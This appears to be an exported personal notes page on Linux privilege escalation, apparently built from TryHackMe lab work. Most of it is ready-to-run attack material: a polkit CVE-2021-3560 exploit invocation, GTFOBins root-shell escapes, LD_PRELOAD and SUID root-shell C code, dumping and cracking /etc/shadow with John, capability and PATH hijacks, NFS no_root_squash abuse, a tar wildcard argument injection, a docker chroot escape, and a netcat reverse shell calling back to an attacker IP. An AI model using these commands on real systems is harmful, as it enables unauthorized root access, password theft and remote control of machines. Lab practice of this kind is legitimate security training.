<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Linux</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Linux</h1><br/><p><strong>Linux Preveledge Escalation</strong></p><p></p><p><a href="https://github.com/CybeXRay/CVE-2021-3560-Polkit-Privilege-Esclation">https://github.com/CybeXRay/CVE-2021-3560-Polkit-Privilege-Esclation</a></p><p></p><p>• This exploit works only on distributions that have installed <code>accountsservice</code> and <code>gnome-control-center</code> and it must have <code>polkit</code> version 0.113 (or later) OR <code>0-105-26</code> (Debian fork of <code>polkit</code>).</p><p></p><p>As this is a timing based exploit, it might be required to run multple times. (I got in 7-8th time)</p><p></p><p>It creates a sudo user (default-secnigma) with the password we provide. Then just su into this user &amp; run sudo bash to get into root.</p><p></p><p>./poc.sh -p=12345</p><p></p><p>Or if we want custom username:</p><p></p><p>./poc.sh -u=cybexray -p=12345</p><p></p><p></p><p><a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p><p></p><p>pspy can be used to list/view all processes using a non-root account. This can be helpful to find misconfigurations</p><p></p><p></p><p>Upload to victim machine as normal user and run it</p><p>./pspy64s</p><p></p><p></p><p><strong>THM:</strong></p><p></p><p><a href="https://camo.githubusercontent.com/eda971feea35d0dbda6e982c6132d0bff82c438482774d98c0d15eafa625813f/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f44415a73453256555141415f62705a2e6a7067"><img src="images/65-1.png" alt="images/65-1.png" /></a></p><p></p><p></p><p><strong>Local Prevelege Escalation Guide/Walkthrough for Windows/Linux in PDF:</strong></p><p>https://github.com/sagishahar/lpeworkshop</p><p></p><p><strong>Key Commands:</strong></p><p>hostname</p><p>uname -a</p><p>lsb_release -a</p><p>cat /proc/version</p><p>cat /etc/issue</p><p>cat /etc/passwd</p><p>history</p><p>ifconfig</p><p>ip route 			:	To see which network routes exists</p><p>ps</p><p>netstat</p><p>find</p><p>ss -tl					:	Command to investigate sockets for connections</p><p></p><p><strong>Automated Enumeration Tools:</strong></p><p>• <strong>LinPeas</strong>: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</p><p>• <strong>LinEnum: </strong>https://github.com/rebootuser/LinEnum</p><p>• <strong>LES (Linux Exploit Suggester): </strong>https://github.com/mzet-/linux-exploit-suggester</p><p>• <strong>Linux Smart Enumeration: </strong>https://github.com/diego-treitos/linux-smart-enumeration</p><p>• <strong>Linux Priv Checker:</strong> <a href="https://github.com/linted/linuxprivchecker">https://github.com/linted/linuxprivchecker</a></p><p></p><p><strong>To Have Prevelge Escalation from sudo allowed programs:</strong></p><p><strong>https://gtfobins.github.io</strong></p><p></p><p>FIND</p><p>sudo find . -exec /bin/sh \; -quit</p><p>LESS</p><p>sudo less /etc/profile</p><p>!/bin/sh</p><p>NANO</p><p>sudo nano</p><p>^R^X</p><p>reset; sh 1&gt;&amp;0 2&gt;&amp;0</p><p>NMAP</p><p>sudo nmap --interactive</p><p>nmap&gt; !sh</p><p></p><p></p><p><strong><span style="text-decoration:underline;">Using LD_PRELOAD in sudo file:</span></strong></p><p></p><p>LD_PRELOAD is a function that allows any program to use shared libraries. This blog post will give you an idea about the capabilities of LD_PRELOAD. If the &quot;env_keep&quot; option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.</p><p></p><p>The steps of this privilege escalation vector can be summarized as follows;</p><p></p><p>    -Check for LD_PRELOAD (with the env_keep option)</p><p>    -Write a simple C code compiled as a share object (.so extension) file</p><p>    -Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file</p><p></p><p><img src="images/65-2.png" alt="images/65-2.png" /></p><p></p><p></p><p></p><p>The C code will simply spawn a root shell and can be written as follows;</p><p></p><p>#include &lt;stdio.h&gt;</p><p>#include &lt;sys/types.h&gt;</p><p>#include &lt;stdlib.h&gt;</p><p></p><p>void _init() {</p><p>unsetenv(&quot;LD_PRELOAD&quot;);</p><p>setgid(0);</p><p>setuid(0);</p><p>system(&quot;/bin/bash&quot;);</p><p>}</p><p></p><p>We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;</p><p></p><p>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</p><p></p><p>We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.</p><p></p><p>We need to run the program by specifying the LD_PRELOAD option, as follows;</p><p></p><p>sudo LD_PRELOAD=/home/user/ldpreload/shell.so find</p><p></p><p></p><p><strong><span style="text-decoration:underline;">Using SUID:</span></strong></p><p></p><p>find / -type f -perm -04000 -ls 2&gt;/dev/null  will list files that have SUID or SGID bits set.</p><p></p><p>Then check GTFOBins for vulnerable binaries that are allowed SUID.</p><p></p><p>Eg.</p><p>If nano has SUID set. We can access /etc/passwd and /etc/shadow as root</p><p></p><p>Get the passwd and shadow files.</p><p>unshadow passwd.txt shadow.txt &gt; passwords.txt</p><p>Now use John with a good wordlist to crack the passwords.txt</p><p></p><p>OR</p><p></p><p>Add a new user.</p><p>openssl passwd  -1 -salt THM Password1 				---&gt;		It will create a password</p><p>We will then add this password with a username to the /etc/passwd file.</p><p>Copy the root details. See below</p><p></p><p><img src="images/65-3.png" alt="images/65-3.png" /></p><p></p><p><strong>If base64 has suid set</strong></p><p></p><p>base64 /etc/passwd | base64 --decode</p><p>base64 /etc/shadow | base64 --decode</p><p></p><p>Copy the required accounts contents to local machine with name password.txt and shadow.txt</p><p></p><p>unshadow password.txt shadow.txt &gt; crackMe.txt</p><p></p><p>Then crack it</p><p>john --wordlist=/usr/share/wordlists/rockyou.txt crackMe.txt</p><p></p><p></p><p><strong><span style="text-decoration:underline;">Using Capabilities:</span></strong></p><p></p><p>Capabilities are used to give granular preveleges to binary and processes.</p><p>man capabilites   -→ More Info</p><p></p><p>getcap -r / 		:		Tool to list enabled capabilites. </p><p></p><p>getcap -r / 2&gt;/dev/null		:  	As a non preveleged user it gives a lot of error. Thus we add 2&gt;/dev/null to see only the output</p><p></p><p><strong>eg. cap_setuid+ep</strong></p><p><img src="images/65-4.png" alt="images/65-4.png" /></p><p></p><p>For example: vim has capabilities of setuid.</p><p>Note: If we list vim binary, we can&#39;t see any differnece.</p><p></p><p><img src="images/65-5.png" alt="images/65-5.png" /></p><p></p><p>Now, we can use vim from GTFOBin capabilities section</p><p>./vim -c &#39;:py3 import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#39;</p><p></p><p>Note: py3 → python3 or py → python or py2 → python2</p><p>Note: view can be used using the same way as it is also having setuid capability</p><p></p><p>./view -c &#39;:py import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#39;</p><p></p><p></p><p><strong>eg. cap_chown+ep</strong></p><p><img src="images/65-6.png" alt="images/65-6.png" /></p><p></p><p><strong>/usr/local/bin/ruby -e &quot;File.chown(1002, 1002, &#39;/etc/shadow&#39;)&quot;</strong></p><p></p><p>This is change the ownership of the /etc/shadow file to our controlled user. Next, we can add a root password &amp; switch to root.</p><p></p><p></p><p><strong><span style="text-decoration:underline;">Using Cron Jobs:</span></strong></p><p></p><p>Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.</p><p>Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.</p><p></p><p>Any user can read the file keeping system-wide cron jobs under /etc/crontab</p><p></p><p>If we find any root user scripts that we can access and modify, we can add a reverse shell and it will be run as root.</p><p></p><p>Note: Sometimes /etc/crontab will have scripts which are already deleted. These can be exploited if full path is not mentioned.</p><p>Croon job will look for the script in the PATH mentioned in /etc/crontab</p><p></p><p><strong><span style="text-decoration:underline;">Using PATH:</span></strong></p><p>Consider a program:</p><p>#include&lt;unistd.h&gt;</p><p>void main()</p><p>{</p><p>        setuid(0);</p><p>        setgid(0);</p><p>        system(&quot;thm&quot;);</p><p>}</p><p></p><p>Created by root &amp; SETUID bit is set. Thus this program can be run by anyone as root.</p><p>Now we need to create a file named thm and have /bin/bash in it.</p><p></p><p>echo “/bin/bash” &gt; thm</p><p></p><p>Now add the location (say /tmp) of thm to PATH.</p><p></p><p>export PATH=/tmp:PATH</p><p>now run the program with suid bit. We will have root bash.</p><p></p><p><strong><span style="text-decoration:underline;">Using NFS (2 Methods):</span></strong></p><p>To check if NFS is active.</p><p></p><p><strong>rpcinfo -p | grep nfs</strong></p><p></p><p>eg.</p><p><img src="images/65-7.png" alt="images/65-7.png" /></p><p></p><p>To view all Network File Sharing (NFS) configurations.</p><p></p><p><strong>cat /etc/exports</strong></p><p></p><p>eg.</p><p><img src="images/65-8.png" alt="images/65-8.png" /></p><p></p><p></p><p>The critical element for this privilege escalation vector is the “<strong>no_root_squash</strong>” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.</p><p></p><p></p><p>To view network shares from attacker machine:</p><p>showmount -e &lt;Target IP&gt;</p><p>eg.</p><p><img src="images/65-9.png" alt="images/65-9.png" /></p><p></p><p>Mount the share with (&quot;no_root_squash&quot;) enabled</p><p></p><p>mkdir /tmp/backup_on_attacker_machine</p><p>mount -o rw 10.10.78.5:/home/backup /tmp/backup_on_attacker_machine</p><p></p><p></p><p><strong><span style="text-decoration:underline;">Method-1:</span></strong></p><p>Create a program in the share:  <strong>Note:</strong> Use <strong>StongRoot</strong> (<strong>CybeXRay Guides → Wiki Miscellaneous → StrongRoot</strong>)</p><p></p><p>#include&lt;unistd.h&gt;</p><p>int main()</p><p>{</p><p>        setuid(0);</p><p>        setgid(0);</p><p>        system(&quot;/bin/bash&quot;);</p><p>}</p><p></p><p>Compile it and SETUID bit on it to be run by root.</p><p></p><p>gcc nfs_exploit.c -o nfs_exploit -w						[-w: for supress warnings]</p><p>chmod u+s nfs_exploit</p><p></p><p>Now run the program in the target machine. We will have root access.</p><p></p><p><strong>Note:</strong> It will give <strong>full root</strong> access.</p><p></p><p><strong><span style="text-decoration:underline;">Method-2:</span></strong></p><p></p><p></p><p><strong>Target Machine:</strong></p><p>Copy the local <strong>bash</strong> executible from the target machine to the NFS share.</p><p>Eg.</p><p><img src="images/65-10.png" alt="images/65-10.png" /></p><p></p><p></p><p><strong>Attacker Machine:</strong></p><p>Connect the NFS share as root. Then check the bash executible permission.</p><p>Next change it to be owned by root and have SUID bit set.</p><p></p><p><strong>chown root:root	bash</strong></p><p><strong>chmod u+s bash</strong></p><p></p><p>Eg.</p><p><img src="images/65-11.png" alt="images/65-11.png" /></p><p></p><p><strong>Target Machine:</strong></p><p>Run the bash program with -p option to preserver the permissiom</p><p><strong>./bash -p</strong></p><p></p><p><img src="images/65-12.png" alt="images/65-12.png" /></p><p></p><p><strong>Note:</strong> It will give <strong>euid root</strong> access.</p><p></p><p><strong><span style="text-decoration:underline;">Using Tar for Lateral Movement:</span></strong></p><p></p><p><strong>Note: </strong>The same concept can be used for privilege escalation is the script file is owned by <strong>root</strong> and haa <strong>SUID</strong> set.</p><p>And the directory being backed up should be writable by the current user.</p><p></p><p>Source ------→ THM: The Marketplace</p><p>In our scenario, the script running tar is owned by user <strong>michael</strong>.</p><p>However, user <strong>jake</strong> has wrtie access to the directory being backed up.</p><p></p><p></p><p><strong>Steps to Follow:</strong></p><p></p><p>Create a file <strong>shell.sh</strong> with the following contents.</p><p><strong>!#/bin/bash</strong></p><p><strong>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.11.72.31 8888 &gt;/tmp/f</strong></p><p></p><p><img src="images/65-13.png" alt="images/65-13.png" /></p><p></p><p></p><p>we have to make it executible and add two files in the same folder. It will help to run the shell.sh</p><p></p><p><strong>chmod +x shell.sh</strong></p><p><strong>touch /opt/backups/&quot;--checkpoint=1&quot;</strong></p><p><strong>touch /opt/backups/&quot;--checkpoint-action=exec=sh shell.sh&quot;</strong></p><p></p><p><img src="images/65-14.png" alt="images/65-14.png" /></p><p></p><p>Now start listner and run the <strong>backup.sh</strong> as <strong>michael</strong></p><p><strong>sudo -u michael /opt/backup/backup.sh</strong></p><p></p><p>We will get a reverse connection as the user <strong>michael</strong></p><p></p><p></p><p><strong><span style="text-decoration:underline;">Using Docker:</span></strong></p><p></p><p>Command to list container images.</p><p><strong>docker images</strong></p><p><strong>docker image ls</strong></p><p></p><p><img src="images/65-15.png" alt="images/65-15.png" /></p><p></p><p>We see that <strong>alpine</strong> docker image is running.</p><p></p><p>We check GTFOBins for docker privilege escalation.</p><p>I try to run the exploit directly, but it needs a TTY. So we create a python PTY and run it.</p><p></p><p><strong>docker run -v /:/mnt --rm -it alpine chroot /mnt sh</strong></p></div>
</body>
</html>
